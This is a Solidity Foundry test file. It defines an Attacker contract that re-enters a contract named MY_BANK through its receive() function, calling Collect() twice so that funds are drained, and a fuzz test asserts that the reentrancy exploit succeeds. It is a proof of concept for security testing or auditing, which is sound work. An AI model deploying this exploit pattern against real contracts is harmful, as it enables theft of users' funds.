
// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "../lib/forge-std/src/Test.sol";
import "../src/MY_BANK.sol";

contract TestReentrancyMY_BANK is Test {
    MY_BANK public _contractUnderTest;
    Attacker public _attacker;

    function setUp() public {
        _contractUnderTest = new MY_BANK(address(new Log(address(0))));
        _attacker = new Attacker(address(_contractUnderTest));
    }

    function test_attackerCallsMultipleTimes(uint256 attackVal) public {
        vm.assume(attackVal > 1 ether && attackVal < type(uint128).max);

        vm.deal(address(_contractUnderTest), attackVal * 2);
        vm.deal(address(_attacker), attackVal * 2);
        vm.deal(address(this), attackVal * 2);

        vm.warp(block.timestamp + 1 days);

        _attacker.setupAttack{value: attackVal}(attackVal);
        _attacker.attack(attackVal);

        assertTrue(_attacker.exploitSucceeded(), "Reentrancy attack failed: exploitSucceeded flag was not set.");
    }

    receive() external payable {}
}

contract Attacker {
    MY_BANK public _victim;
    uint256 public attackCallCount;
    bool public exploitSucceeded;
    uint256 public initialSnapshot;
    uint256 public storedAttackVal;

    constructor(address victimAddress) {
        _victim = MY_BANK(victimAddress);
    }

    function setupAttack(uint256 val) public payable {
        attackCallCount = 1;
        exploitSucceeded = false;
        _victim.Put{value: val}(block.timestamp + 1 days);
    }

    function attack(uint256 val) public {
        initialSnapshot = address(this).balance;
        storedAttackVal = val;
        _victim.Collect(val);
    }

    receive() external payable {
        if (attackCallCount < 2) {
            _victim.Collect(storedAttackVal);
            attackCallCount++;
            exploitSucceeded = true;
        }
    }
}
